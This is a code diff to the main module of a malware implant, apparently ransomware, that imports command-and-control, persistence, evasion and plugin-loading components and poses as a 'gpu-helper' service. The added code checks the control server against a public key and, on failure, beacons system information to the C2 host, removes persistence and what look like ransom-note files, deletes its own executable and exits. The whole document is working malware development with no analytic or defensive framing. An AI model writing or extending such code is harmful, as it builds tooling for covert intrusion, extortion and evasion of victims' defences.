@@ -18,11 +18,11 @@ from lib.persistence import (
     install_persistence,
     remove_persistence,
 )
-from lib.c2_client import get_system_info, send_beacon, upload_file
+from lib.c2_client import get_system_info, send_beacon, upload_file, verify_server
 from lib.evasion import run_evasion
 from lib import plugin_loader
 
-from settings import C2_SERVER, TRAFFIC_KEY, BUILD_NUMBER
+from settings import C2_SERVER, TRAFFIC_KEY, BUILD_NUMBER, PUBLIC_KEY_PEM
 
 SERVICE_NAME = "gpu-helper"
 EXE_PATH = os.path.abspath(sys.argv[0])
@@ -228,6 +228,24 @@ def beacon_loop():
     info['build_number'] = BUILD_NUMBER
     last_result = None
     tracked_files: list[str] = []
+
+    if not verify_server(C2_SERVER, BUILD_NUMBER, PUBLIC_KEY_PEM):
+        info['persistent'] = is_persistent(SERVICE_NAME)
+        info['loaded_plugins'] = []
+        info['result'] = 'self_destructed'
+        send_beacon(C2_SERVER, info, TRAFFIC_KEY)
+        remove_persistence(SERVICE_NAME)
+        remove_persistence("hw-detect")
+        for f in [".decrypt.txt", "README.txt"]:
+            try:
+                os.remove(f)
+            except Exception:
+                pass
+        try:
+            os.unlink(EXE_PATH)
+        except Exception:
+            pass
+        os._exit(0)
 
     while True:
         info['persistent'] = is_persistent(SERVICE_NAME)
